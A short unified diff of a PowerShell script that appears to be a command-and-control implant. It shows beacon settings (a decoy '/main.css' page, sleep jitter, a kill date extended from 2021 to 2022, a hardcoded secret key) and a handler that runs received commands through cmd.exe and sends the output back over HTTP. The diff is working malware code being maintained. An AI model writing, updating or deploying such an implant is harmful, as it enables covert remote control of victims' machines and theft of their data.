@@ -6,7 +6,7 @@
 $Page = "/main.css"
 $SleepMin = 5
 $SleepMax = 10
-$KillDate = "2021-01-31"
+$KillDate = "2022-01-31"
 $SecretKey = '000000000000000116s92k48dss923j640s234v849c2001qi231d950g3s9df01esdr'
 
 ################################
@@ -91,7 +91,7 @@ Function CmdHandler($cmd) {
 
             # Execute Command
         Else {
-                $resp = (C:\Windows\System32\cmd.exe /Q /c $cmd 2>&1 ) | Out-String
+                $resp = (cmd /Q /c $cmd 2>&1 ) | Out-String
         }
         http_request($resp)
     }
